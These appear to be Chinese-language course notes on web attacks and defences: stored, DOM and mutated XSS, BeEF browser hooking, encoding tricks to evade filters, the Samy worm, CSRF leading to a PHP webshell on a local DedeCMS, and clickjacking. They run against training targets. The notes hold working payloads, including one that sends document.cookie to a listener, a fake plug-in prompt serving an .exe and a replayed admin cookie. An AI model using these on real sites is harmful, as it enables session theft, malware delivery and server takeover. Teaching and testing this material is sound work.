- 对陌生的链接，不要随意点开。 





### 存储型 XSS 

#### 定义

- 存储型 XSS 是指应用程序通过 Web 请求获取不可信赖的数据，在未检验数据是否存在 XSS 代码的情况下，便将其存入数据库。
- 当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行 XSS 代码，存储型XSS 可以持续攻击用户。 
- 存储型 XSS 出现位置
  - 留言板
  - 评论区
  - 用户头像
  - 个性签名
  - 博客 



#### Beef 工具

- BeEF
  - 全称 The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 用 Ruby 语言开发的，Kali 中默认安装的一个模块，用于实现对 XSS 漏洞的攻击和利用。
  - 自带一个 JS 脚本和后台管理页面。 
- BeEF原理 
  - ![1618579492877](HackerMeWeb.assets/1618579492877.png)

#### Beef 安装

- docker pull registry.cn-shanghai.aliyuncs.com/yhskc/beef
- docker run --name=beef -d -p 0.0.0.0:3000:3000 registry.cn-shanghai.aliyuncs.com/yhskc/beef
- docker ps
- 访问：http://127.0.0.1:3000/ui/authentication
- 登录：
  - Username: sec
  - Password: sec
- 注入的 XSS 钩子文件地址，http://127.0.0.1:3000/hook.js



#### bWAPP XSS 测试

- 安装 bWAPP 靶机，启动，进入浏览器，输入 http://127.0.0.1/portal.php ，登录

- Choose your bug:

  - Cross-Site Scripting - Stored (Blog)

- 在输入框中，测试输入

  - test
  - 点击 submit ，可以展示出来输入的内容，此时将其存入数据库中

- 继续测试输入

  - <script>alert(1);</script>

  - 点击 submit ，此时就会在浏览器弹出1的对话框，此时就实现了存储型 XSS 

- 进入docker 交互式界面

  - docker ps
  - docker exec -it bwapp bash
  - mysql -u root -p
  - show databases;
  - use bWAPP;
  - show tables;
  - select * from blog;



#### bWAPP + Beef XSS 测试

- 安装 bWAPP 靶机，启动，进入浏览器，输入 http://127.0.0.1/portal.php ，登录

- Choose your bug:

  - Cross-Site Scripting - Stored (Blog)

- 在输入框中，测试输入

  - <script src="http://127.0.0.1:3000/hook.js">xss</script>

  - 测试就实现了存储型 XSS

- 进入 Beef 控制台

  - http://127.0.0.1:3000/ui/panel
  - 在 Online Browsers 中可以看到 127.0.0.1下面就有可以被控制的 浏览器
  - 点击浏览器，
    - 在 Details 中，可以看到电脑的配置信息，浏览器的信息，网络 IP 等信息
    - 在 Commands 中，可以看到可以执行的一些操作
      - 点击 Browser ，可以看到三种标识颜色的命令
        - 浅绿色，代表可以执行的命令，并且不会被用户察觉到
        - 灰色，代表执行命令可以被用户察觉到
        - 红色，代表不知道是否可以执行的命令
      - 点击 Social Engineering，
        - 点击Fake Notification Bar（Firefox）
        - 此时，在 Plugin URL: 中输入需要安装插件的 URL 地址，可以给一个 http://0.0.0.0:3000/newHook.exe
        - Notification text: 使用默认的内容，为 An additional plug-in is required to display some elements on this page.
        - 点击右下角，Execute，就可以在 被控制的浏览器页面 http://127.0.0.1/xss_stored_1.php 的最上面出现，An additional plug-in is required to display some elements on this page. 并且可以点击 后面的 Install Plug-in 按钮 进行安装
        - 虽然点击按钮之后，跳转的页面是 http://0.0.0.0:3000/newHook.exe ，是一个无法访问的页面，但是可以通过优化，实现插件的下载安装



#### 防御方式

- 针对 XSS 防御

  - 对用户的输入进行合理验证，对特殊字符（如<、>、’、”等）以及 <script>、 javascript 等进行过滤。
  - script过滤  ------------------- 大小写，双写绕过
  - 输入长度过滤  ------------------- 在js中，抓包修改
  - `/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i -------------------  ` <img src=x onerror=alert("xss")>
  - ()过滤  ------------------- <script>alert`xss`</script>
  - ' " 过滤  ------------------- <script>alert(/xss/)</script> 

- 采用 OWASP ESAPI 对数据输出 HTML 上下文中不同位置（HTML 标签、HTML属性、JavaScript 脚本、CSS、URL）进行恰当的输出编码。 

  - htmlentities（） 
  - ![1618581042551](HackerMeWeb.assets/1618581042551.png)

- HTML实体 

  - ![1618581066205](HackerMeWeb.assets/1618581066205.png)
  - ![1618581096334](HackerMeWeb.assets/1618581096334.png)

- 设置 HttpOnly 属性，避免攻击者利用跨站脚本漏洞进行 Cookie 劫持攻击。在 Java EE 中，给 Cookie 添加 HttpOnly 的代码如下： 

  - ```properties
    java:
    cookie.setHttpOnly(true);
    
    python:
    tools.sessions.httponly = True
    
    php:
    session.cookie_httponly =1
    ```





### DOM型 XSS 

#### DOM 定义

DOM 模型用一个逻辑树来表示一个文档，每个分支的终点都是一个节点 （ node） ，每个节点都包含着对象（ objects） 。 

DOM 的方法（ methods） 让你可以用特定方式操作这个树，用这些方法你可以改变文档的结构、样式或者内容。 

![1618654276190](HackerMeWeb.assets/1618654276190.png)



#### DOM 型 XSS 漏洞定义

DOM 型 XSS 其实是一种特殊类型的反射型 XSS，通过 JS 操作 DOM 树动态地输出数据到页面，而不依赖于将数据提交给服务器端，它是基于 DOM 文档对象模型的一种漏洞。 

```html
<html>
	<body>
    	<script>
        	document.write("<script>alert(0);<\/script>");
        </script>
    </body>
</html>
```



#### DOM 型 XSS 漏洞与反射型的异同点和危害

- 同：
  - 都是没有控制好输入，并且把 javaScript 脚本 输入作为输出插入到 HTML 页面。
- 异：
  - 反射型 XSS 是经过后端语言后， 页面引用后端输出生效。 
  - DOM XSS 是经过 JS 对 DOM 树直接操作后插入到页面。
- 危害性：
  - 前后端分离，不经过 WAF 的检测。



#### DOM型 XSS 测试示例

- 测试代码的静态页面为
  - HackerMeCode\XSS\DOMXSS\DomXSSDemo.html
- 正常输入
  - 输入：rmliu ，点击提交
  - 会看到页面显示出 rmliu 的内容
- XSS 输入
  - 输入：<script>alert(rmliu);</script>，点击提交
  - 此时，就会直接在页面上弹出新的对话框，内容为 rmliu



#### DVMA 靶机测试

- 安装，并登录 DVWA 靶机
- 选择bug类型：XSS (DOM)
- 正常输入
  - Please choose a language，选择 English，点击 Select
  - 此时地址栏显示的网址是 ，http://127.0.0.1:81/vulnerabilities/xss_d/?default=English
- XSS 输入
  - 在地址栏中，将 English ，变为 <script>alert(1);</script>
  - 此时的访问地址为：http://127.0.0.1:81/vulnerabilities/xss_d/?default=<script>alert(1);</script>
  - 此时就会弹出对话框，内容为1
  - 并且页面上的选择框中的内容为空，进入控制台，查看元素，可以知道此时选择框的内容就是输入的 script  脚本内容
- 复杂 XSS 输入
  - 将访问地址变为：http://127.0.0.1:81/vulnerabilities/xss_d/?default=<script>var pic=document.createElement("img"); pic.src="http://127.0.0.1:333/getCookie?" + escape(document.cookie)</script>
  - 并且在本地使用nc，监听本地的333端口，在命令行中输入：nc -l -p 333
  - 此时，就可以在命令行中看到，请求中的信息，就完成了 DOM 型 XSS 利用
  - ![1618655929733](HackerMeWeb.assets/1618655929733.png)





### 突变 XSS （mXSS）

#### 定义

- m --> Mutated-突变
- 攻击者输入看似安全的内容，在解析标记时经过浏览器重写或者修改，发生突变，生成不安全的代码并执行，即mXSS，极难被检测和过滤。 



#### HTML 过滤器 

- 元素: <div>, <b>, <i> and <img>. 
- 属性: src. 
- 示例程序
  - HackerMeCode\XSS\mXSS\mXSS.html
  - HackerMeCode\XSS\mXSS\mXSSExample.html
  - HackerMeCode\XSS\mXSS\mXSSDemo.html



#### jQuery 跨站脚本漏洞 

- 网址
  - CNNVD-202004-2420
  - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202004-2420
- 漏洞
  - ![1618658318631](HackerMeWeb.assets/1618658318631.png)



### 伪协议 

#### 伪协议是什么 

- 伪协议不同于因特网上所广泛使用的如 http://,https://,ftp://，在 URL 中使用，用于执行特定的功能：
- Data 伪协议：
  - data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
- JavaScript 伪协议 ：
  - javascript:alert("1") 



#### 伪协议示例

- 用于对 <script> 标签，（，），`， ' ，" 等过滤的绕过。 
- 参见示例代码：HackerMeCode\FakeProtocol\FakeProtocolExampl.html
- 可以分别在本机的浏览器中测试，会有不一样的弹出框结果，主要是由于不同浏览器对于伪协议的支持问题





### 编码与解码

#### Unicode 编码

- ISO （国际标谁化组织）制定的包括了地球上所有文化、所有字母和符号的编码，使用两个字节表示一个字符，
- Unicode 只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。
- 具体存储由：UTF-8，UTF-16等实现。 



#### Unicode 编码及 URL 编码 

- JavaScript 编码
- HTML 实体编码 
- URL 编码 
- 测试示例 `test` ，分别展示如下:
  - &#x、\u 都可以用来表示一串 unicode 编码 
  - `\u0074 \u0065 \u0073 \u0074 `
  - `&#x74 &#x65 &#x73 &#x74 `
  - `&#116 &#101 &#115 &#116`
  - `%74 %65 %73 %74 `



#### 浏览器解码

解析一篇 HTML 文档时主要有三个处理过程：HTML 解析，URL 解析和 JavaScript 解析。

每个解析器负责解码和解析 HTML 文档中它所对应的部分，且顺序也有所区别。 



#### HTML 解码 

- 示例程序：HackerMeCode\EncodeAndDecode\HTMLDecode.html
- 对于a标签，href属性 javascript:alert(1) 编码比较 r-> &#x 72 



#### URL 解码 

- 示例程序：HackerMeCode\EncodeAndDecode\URLDecode.html
- 对于a标签，href属性 javascript:alert(1) 编码比较 r-> %72 



#### JavaScript 解码 

- 示例程序：HackerMeCode\EncodeAndDecode\JavaScriptDecode.html
- 对于a标签，href属性 javascript:alert(1) 编码比较 r-> \u0072； (-> \u0028



#### 二层混淆解码 

- 示例程序：HackerMeCode\EncodeAndDecode\DoubleDecode.html
- 对于a标签，href属性 javascript:alert(1) 二层编码比较: js 编码 -> url 编码 -> html 编码
- 解码顺序：
  - HTML  --> URL --> JS



#### 三层混淆解码 

- 示例程序：HackerMeCode\EncodeAndDecode\TripleDecode.html
- js 编码 -> url 编码 -> html 编码





#### 综合混淆解码

- 源解码内容

  - ```html
    &#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x25;&#x32;&#x38;&#x25;&#x33;&#x32;&#x25;&#x33;&#x33;&#x25;&#x33;&#x32;&#x25;&#x33;&#x33;&#x25;&#x32;&#x39;
    ```

- HTML Decode

  - http://monyer.com/demo/monyerjs/

  - ```html
    javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34%28%32%33%32%33%29
    ```

- URL Decode

  - https://www.urldecoder.org/

  - ```javascript
    javascript:\u0061\u006c\u0065\u0072\u0074(2323)
    ```

- Unicode Decode

  - https://www.online-toolz.com/tools/text-unicode-entities-convertor.php

  - ```html
    javascript%3Aalert%282323%29
    ```

- URL Decode

  - ```javascript
    javascript:alert(2323)
    ```



### XSS 蠕虫

#### 定义与原理

- XSS 蠕虫定义
  - XSS 蠕虫是一种跨站脚本病毒，大多使用 JavaScript 脚本编写，突破浏览器的安全限制，
  - XSS 蠕虫基于社会工程学诱使用户点击访问其发出的恶意邀请链接在网站上感染访问网站的用户，受感染的用户发送含有蠕虫的内容，再感染安全的用户。 
- XSS 蠕虫原理
  - 基于存储型 XSS 漏洞，攻击者在 Web 页面植入恶意代码。
  - 发送伪装的邀请链接。
  - 用户点击链接被感染。
  - 新感染的用户向好友发送伪装的邀请链接。 
- XSS 蠕虫危害
  - 这是一个传十，十传百的 传播方式， 感染效率极高，XSS蠕虫的感染速度是随Web应用程序的用户访问量几何数递增的
  - xss蠕虫基于 xss， 所以xss 能利用的功能。蠕虫都能够利用，而且 由于xss蠕虫比存储型XSS漏洞更强的传播性，危害性 极大。 



#### CSS （层叠样式表） 

- 定义如何显示 HTML 元素 
- 示例程序：HackerMeCode\CSS\CSSDemo.html



#### AJAX

- AJAX 是在不重新加载整个页面的情况下并更新部分网页的技术。当需要异步与服务器交换数据时，需要 XMLHttpRequest 对象来异步交换。
- 启动 BWAPP 漏洞容器
  - 浏览器输入：http://127.0.0.1/ajax/index.html 
  - 在输入框中输入一个字母，就可以看到会有对应的匹配内容展示出来，就是使用的是 AJAX 技术
  - 源码文件：HackerMeCode\AJAX\AJAXDemo.html





#### Samy 蠕虫 

- 当时年仅19岁的 Samy Kamkar 发起了对 MySpace.com （社交网站）的攻击，Samy Kamkar 的蠕虫病毒在20个小时被超过一百万人执行。在每个人的自我简介后边加了一句话：“but most of all, Samy is my hero.” 
  - https://myspace.com/
- Samy Kamkar成为全球第一个AJAX蠕虫的作者
- 我们这节课讲解的这款蠕虫，在历史上有重要地位。
- 2009年的Twitter蠕虫事件和2011年新浪微博蠕虫事件都沿袭了他当时的方法。
- myspace 在当时是全球最大的的社交网站。相当于现在的facebook ，推特 ,他们的安全防护在当时自然也是极高的。 



#### Samy 蠕虫源码分析

- 示例程序：HackerMeCode\SamyWorm\SamyWormDemo.html
- 代码原文，最大长度限制，必需紧凑的代码，含义不清的命名，函数高度复用相比代码优雅结构清晰， 这里可以理解编程的另一种极致， 想象力和精简的极致. 
- Myspace 屏蔽了很多标志符。
  - 事实上，他们只允许<a>,<img>类，和<div>类，或许还有其他一些（例如，`<embed>`类）。
  - 他们不允许`<script>`类， `<boday>`类， onClinks, onAnythings, 带javascript的<href>类。
  - 之前的 向百度请求了背景图片，请求是url形式执行，可使用伪协议执行javascript脚本。 但是当时某些浏览器（IE，部分Safari和其他）允许CSS标识符中带有javascript.
  - 之前使用 alert是用于检测 xss, 实际xss攻击使用 eval
  - `<div id=mycode style="BACKGROUND: url('java script:eval(document.all.mycode.expr)')" expr="var B=String.fromCharCode(34);    var A=String.fromCharCode(39);`
    - 第一行 javascript 中的空格原本是换行符 \n ，用于绕过 对javascript 单词的检测。
    - 第一行 由于单双引号已经被使用，直接编写脚本 非常困难，这里使用表达式来替代要 执行的脚本，后面所有脚本都在 expr属性里面。
    - 第一行 由于myspace 禁止单双号转义， 10进制翻译成ASCII来生成引号， 34是 双引号， 39 单引号。
  - `return eval('document.body.inne'+'rHTML')`
    - 中间， myspace 禁止了 innerHTML ,用 eval函数和 字符串拼接 得到内部的文本。 
  - 更加详细的源码分析，见示例程序。



### XSS 编码混淆 

#### 混淆方法

- 混合编码
- 二层混淆
- 三层混淆
- JSFuck 



#### 混合编码

- 就是对 XSS 代码的不同部分使用不同的编码方式，以此绕过防护软件的过滤。

- 一定要遵循浏览器的规则才可以确保代码能够被浏览器理解！！！ 

- 例子

  - ```html
    <a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74:\u0061\u006c\u0065\u0072\u0074 (/xss/)">test</a>
    ```

  - 成功触发弹窗 

- 浏览器解码原理

  - ![1618720420153](HackerMeWeb.assets/1618720420153.png)



#### 二层混淆

- 二层混淆就是对 XSS 代码在遵循浏览器解码规则的情况下进行两次编码，让防护软件无法理解 XSS 代码，进而绕过防护软件。 

- 例子

  - ```html
    <a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(/xss/)">test</a>
    ```

  - 成功触发弹窗 

- 浏览器解码原理

  - ![1618720580965](HackerMeWeb.assets/1618720580965.png)



#### 三层混淆

- 三层混淆就是在二层混淆的基础上再增加一次编码，让防护软件无法理解 XSS 代码，进而绕过防护软件。 

- 例子

  - ```html
    <a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;(/xss/)">test</a>
    ```

  - 成功触发弹窗 

- 浏览器解码原理

  - ![1618720660049](HackerMeWeb.assets/1618720660049.png)



#### JSFuck

- JSFuck 使用6 个字符 []()!+ 来编写 JavaScript 程序 
- 官网：
  - http://www.jsfuck.com/
  - https://github.com/aemkei/jsfuck
- 基础知识
  - ![1618720737323](HackerMeWeb.assets/1618720737323.png)
- []==![]
  - 类型转换
  - JS 语法中 == 两边如果不是同一类型则会进行类型转换
  - Boolean([]) //true， Boolean(![]) //false
  - 上述代码，我们进行了强制转换，在js中在把对象做布尔值转换的时候，会把所有对象都转换为true
  - 原题变为 空数组 == false --> 空数组 == 0 --> 0 == 0 --> 返回 True 
- JSFuck语句
  - false => ![] // 非运算符会把[]的布尔值取反
  - true => !![] // 再取反则是true
  - undefined => [][[]] // 在js中数组的索引可以为负数和非整数，而在这种情况下会将索引转换成字符串，作为对象的属性访问，我们知道[]转换为字符串为空字符串，则上面等价于：`[]['']`。然而数组对象并没有名为''的属性，在js中访问一个对象并不存在的属性时，会给出undefined
  - NaN => +[![]] // 这里利用了+运算符的特性，这里+不是加号运算符（姑且这么叫）而是一元运算符的一种，一元加法，用于把操作数转换为数字或者NaN并返回这个字。上式等价于+[false]，而根据类型转换的规则我们知道，这样得到的结果为NaN 
  - 0 => +[] // 根据类型转换规则，[]转换为数字为0
  - 1 => +!+[] // 上面的变式，根据运算符的优先级，先执行+[]为0，再转换成布尔取反为true，true转换为数字为1
  - 2 => !+[]+!+[] // 中间一个+为加法运算符优先级比较低，等价于true+true，值为2字符串
  - 10 => [+!+[]]+[+[]] // 可拆分成[+!+[]]加[+[]]，左边为[1]，右边为[0]，+作为连接字符串运算符，而根据数组转换成字符串我们可以知道上面等价于‘1’+‘0’，得到的是字符串‘10’ 
- 可以将任意的js语句在官网上进行 Encode，获得编码后的表示方式
  - 如：alert(1)



### CSRF 

#### HTTP

- HTTP 协议是（Hyper Text Transfer Protocol）超文本传输协议的缩写。
- 主要用于 Web 端的内容获取，也就是访问 Web 页面所使用的协议。 
- 客户端与服务端通信过程
  - ![1618737327300](HackerMeWeb.assets/1618737327300.png)
- 无记忆性：
  - HTTP 是一种无状态协议，即服务器不会保留与客户交易时的状态。
  - 用户 A 在很短的时间间隔内向 Web 服务器发送了两次同样的请求，服务器并不会因为已经响应了该请求一次就不对第二次请求进行响应，因为服务器并不知道已经响应过一次该请求。
  - 假设用户在网站 A 的某一个页面上已经完成了登录操作，当在该网站的另一个页面上执行的操作需要验证用户登录的时候任然需要用户再次登录，因为 HTTP 并不知道你已经登录，它不会维持你的登录状态。 
- Cookie
  - 为了让服务器能够记住用户引入了 Cookie 机制。 
  - 当用户访问站点的时候，站点会为该用户分配一个Cookie值，站点使用该Cookie值来标记用户，当用户浏览器接收到包含Cookie值的数据包后，会将Cookie的值取出，存放到浏览器中，随后浏览器会在发往该站点的数据包中自动的填充该Cookie值
  - Cookie值的填充是浏览器的行为！！！ 
  - ![1618737490974](HackerMeWeb.assets/1618737490974.png)



#### DedeCMS 靶场

- 启动 phpstudy
- 配置：
  - 环境 --> 数据库 --> 更多 --> MySQL5.7.26
  - 首页 --> 套件 --> MySQL5.7.26 启动
  - 网站 --> 管理 --> php版本 --> php5.2.17nts
  - 环境 --> php --> 更多 --> php5.2.17nts
  - 网站 --> 管理 --> 打开根目录（此时，弹出根目录对话框） --> 查看DedeCMS-V5.7-UTF8-SP1\docs\readme.txt ，将DedeCMS-V5.7-UTF8-SP1\uploads 整个文件全部放到根目录下
- 访问
  - http://127.0.0.1/uploads/install/index.php
  - 我已经阅读并同意此协议  --> 继续  --> 继续  --> 在参数设置中 **初始化数据体验包**：不存在  --> 选中  **安装初始化数据进行体验**(体验数据将含带DedeCMS大部分功能的应用操作示例) ，点击远程获取  --> 此时就展示的是 [√] 存在(您可以选择安装进行体验)  
  - 进入 phpstudy  --> 数据库 --> 鼠标悬停在密码上面，可以看到密码上 root
  - 浏览器的参数设置页面中 --> 数据库设定 --> **数据库密码：** root  --> 管理员初始密码，用户名 admin，密码 admin，cookie 加密码：iUHIgK0xHbK4WGGhkHSsV1aItgSyq
  - 点击继续，安装完成
  - 访问网站首页：http://127.0.0.1/uploads/index.php?upcache=1
  - 登录网站后台：http://127.0.0.1/uploads/dede/login.php?gotopage=%2Fuploads%2Fdede%2F
    - 用户名 admin，密码 admin



#### Cookie 测试

- 启动 phpstudy，完成edeCMS 靶场设置，启动 BurpSuite，启动 Switchhost

- 访问网址，http://xforburp.com/uploads/dede/ ，实现登录

- 可以在 BurpSuite 中看到一堆请求信息，找到 POST 请求 /uploads/dede/login.php

  - Request 在用户登录的数据包，请求体中包含登录账号的信息，用户名userid和密码pwd，`gotopage=%2Fuploads%2Fdede%2F&dopost=login&adminstyle=newdedecms&userid=admin&pwd=admin&validate=CRQI&sm1=`
  - Response 在响应的数据包中，携带 Set-Cookie字段 
  - 提交了用户名和密码登录后，在服务器返回的数据包中携带类的Set-Cookie字段，该字段就是为当前登录用户设置的Cookie的值， 
  - ![1618739628399](HackerMeWeb.assets/1618739628399.png)

- 浏览器中查看本地的 Cookie

  - 打开控制台 --> 存储 --> Cookie  --> http://xforburp.com --> set-cookie字段
  - 浏览器在接收到这些Cookie的值之后会将set-cookie字段的值存放到浏览器中 

- 恶意请求测试

  - 修改请求数据包的 Cookie 为管理员的 Cookie 

    - 管理员的 Cookie

    - ```http
      Cookie: menuitems=1_1%2C2_1%2C3_1; security_level=0; PHPSESSID=3f7ff39e207cec93246559485fb732ac; DedeUserID=1; DedeUserID__ckMd5=2ee97fcbc26619dd; DedeLoginTime=1618739313; DedeLoginTime__ckMd5=92f0f7bcf3006251
      ```

  - 即使不输入密码也可以登录网站后台 



#### CSRF

- 数据包中 Cookie 的值是浏览器从本地存储中取出，并自动填充到数据包中。
- 如果攻击者控制了用户浏览器并且窃取了cookie。
- 浏览器会自动完成 Cookie 的填充，目标网站会误认为该数据包就是管理员发送的，会以管理员的权限进行相关的操作。 
- 请求流程
  - ![1618740021333](HackerMeWeb.assets/1618740021333.png)
- 在 DedeCMS 后台管理页面，能够直接新建文件。
  - 核心 --> 附件管理 --> 文件式管理器  --> 新建目录 --> 新建文件



#### CSRF 测试

- CSRF看上去危害并不大，这里将演示通过 CSRF完成 getshell 
- 管理员在新建文件的时发送的数据包 ，POST /uploads/dede/file_manage_control.php
- 那么如果我们能够控制登录了管理员账号的浏览器发送上面的数据包，并新建一个木马文件，就可以完成getshell 
- 构造了下面的 POC 
  - 示例代码：HackerMeCode\CSRF\POC.html
- 在同一个浏览器中访问了恶意链接 
  - 点击Submit request
  - 此时就会创建一个 tf2.php 文件，在  phpstudy_pro\WWW\uploads\uploads\rmliu 下，如果没有rmliu文件夹，需要自己创建一下，或者修改 activepath 的 value 值
- php 一句话木马测试
  - 浏览器输入：http://xforburp.com/uploads/uploads/rmliu/tf2.php?cmd=phpinfo();
  - 此时就可以展示出PHP版本信息，完成木马利用



#### HTTP Referer 防御

- CSRF 防御
- 在进行 CSRF 测试的时候，会有一个 Referer: http://localhost:63342/ 请求字段
  - ![1618742275689](HackerMeWeb.assets/1618742275689.png)
- 站点可以对一些敏感操作限制其 Referer 字段的值，比如某站点转账的时候使用:
  - http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory
  - 转账的操作一定是用户登录之后在本站点的页面上操作的，因为可以将 Referer 字段限制为只允许本站点。 



#### Token 防御

- CSRF 防御
- CSRF 成功的原因在于站点对于用户身份的辨别依赖于 Cookie ，因此攻击者可以在不知道用户口令的情况下直接使用用户的 Cookie 来通过安全验证。
- 在 HTTP 请求中以参数的形式加入一个随机产生的 Token，服务器接收到用户请求后会验证 Token，如果没有 Token 或者 Token 不正确都会被认为是攻击而直接丢弃。
- GET 请求: http://url?csrftoken=tokenvalue
- POST 请求: <input type="hidden" name="csrftoken" value="tokenvalue"/> 
- Token-由 Web 应用程序添加到数据包中，Cookie-由浏览器添加到数据包，之所以会存在 CSRF 是因为浏览器会自动的将本地的 Cookie 添加到数据包，但是Token 浏览器是不知道，是由网站的应用程序添加到数据包中。 
- 注意：
  - 比如攻击者可以在网站发布自己服务器的地址，当普通用户点击了该地址后，由于该站点会在地址后面添加 Token，也就造成了 Token 的泄露。
  - 站点对内链和外链进行区分，只在内链中添加 Token，对于外链就不添加 Token。 



### 同源策略 

#### 同源

- (协议、主机、端口)

- 如果两个 URL 的协议、主机、端口都相同，则认为这两个 URL 同源 

- http://example.com/dir/page.html 

- | URL                                 | 是否同源 | 说明     |
  | ----------------------------------- | -------- | -------- |
  | http://example.com/dir2/page2.html  | 是       |          |
  | https://example.com/dir/page.html   | 否       | 协议不同 |
  | http://example.com:81/dir/page.html | 否       | 端口不同 |
  | http://other.com/dir/page.html      | 否       | 主机不同 |



#### 同源策略

- 同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。
- 同源策略限制了从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。 
- 从以下两个方面介绍同源策略：
  1. Cookie
  2. DOM 



#### Cookie

- 在同源策略的限制下非同源的站点是不能够互相读取 Cookie 的，这个限制在父/子域名中同样存在。 
  - ![1618800966994](HackerMeWeb.assets/1618800966994.png)

- 通过设置 domain 打破了浏览器对于 Cookie 的同源限制，可以通过子站入手，通过子站获取子站的 Cookie 值。
  -  ![1618801091292](HackerMeWeb.assets/1618801091292.png)
  - ![1618801119646](HackerMeWeb.assets/1618801119646.png)



#### DOM

- 在同源策略的限制下非同源的站点是无法相互获取 DOM ，这里以子域名之间获取 DOM 为例子。 
  - ![1618801238850](HackerMeWeb.assets/1618801238850.png)
  - ![1618801273211](HackerMeWeb.assets/1618801273211.png)
- 通过设置 domain 打破了浏览器对于 Dom 的同源限制，可以通过子站入手，修改主站的 DOM 树。 



### 点击劫持 

#### iframe 标签

- iframe 元素会创建包含另外一个文档的内联框架（即行内框架），简单来说就是在 HTML 页面中包含另外一个页面。 
- 通过 iframe 标签在一个页面中嵌入了两个页面 
- 示例程序：HackerMeCode\IFrame\IFrameDemo.html



#### opacity

- opacity 是 CSS 的一个属性，用来设置元素的透明度。 

- 该属性的取值范围为0-1，默认情况下为1。 

- ```html
  {
  	opacity:1;
  }
  ```

- 在 iframe 的基础上，将第一个页面的 opacity 调整了为0.2后，可以看到透明度的变化。

- 示例程序：HackerMeCode\IFrame\IFrameOpacityDemo.html



#### z-index

- z-index 是 CSS 的一个属性，用来指定一个元素的堆叠顺序。
- 拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。 
- 示例程序：HackerMeCode\IFrame\ZIndexDemo.html
  - 通过调整z-index的值，造成不同的显示效果
  - 第一张截图文字的z-index为0，图片的z-index为-1
  - 第二张截图文字的z-index为0，图片的z-index为1 
  - ![1618806332782](HackerMeWeb.assets/1618806332782.png)



#### 点击劫持定义

- 点击劫持又名 UI- 覆盖攻击，因为该攻击会劫持用户的点击操作，所以被命名为点击劫持，这是一种视觉上的欺骗手段。
- 主要劫持目标是含有重要会话交互的页面，如银行交易页面、后台管理页面等。 
  - 就是一个按钮
  - ![1618806431980](HackerMeWeb.assets/1618806431980.png)
  - 示例程序：HackerMeCode\IFrame\ClickJackingDemo.html



#### XSS to Clickjacking 

- 在存在 XSS 漏洞的位置输入 payload 

- ```sh
  <iframe src="https://time.geekbang.org/course/intro/100055001?utm_campaign=guanwang&utm_source=baidu-ad&utm_medium=ppzqpc&utm_content=title&utm_term=baidu-ad-ppzq-title" style="opacity: 0.3;position:absolute;left:0px;top:150px;z-index:3;”
  ></iframe>
  ```

- 当用户点击原页面的 Go 按钮后，实际点击的是内嵌页面的订阅按钮。

- 为了能看到效果没有将透明度调整为0.3需要说明的是，这里只是举例，实际订阅是需要登录以及后面一系列操作的，这是只是为了演示劫持点击的效果 

- ![1618806929460](HackerMeWeb.assets/1618806929460.png)

- ![1618806958923](HackerMeWeb.assets/1618806958923.png)

- 对于这里的使用get方式触发的反射型XSS可以构造下面的恶意链接，并诱导用户点击： 

  - ![1618807046238](HackerMeWeb.assets/1618807046238.png)

- 这里的链接看上去就不太正常，这里只是为了起到说明作用，可以使用工具对URL进行伪装URL伪装工具

  - 在线短链接生成器：http://tool.chinaz.com/tools/dwz.aspx 





### HTML5 新标签 

#### HTML5 

HTML5 赋予网页更好的意义和结构。新的 HTML 标签像 <header>, <footer>，<nav>，<section>， <aside> 等等，使得阅读者更加容易去访问内容。 

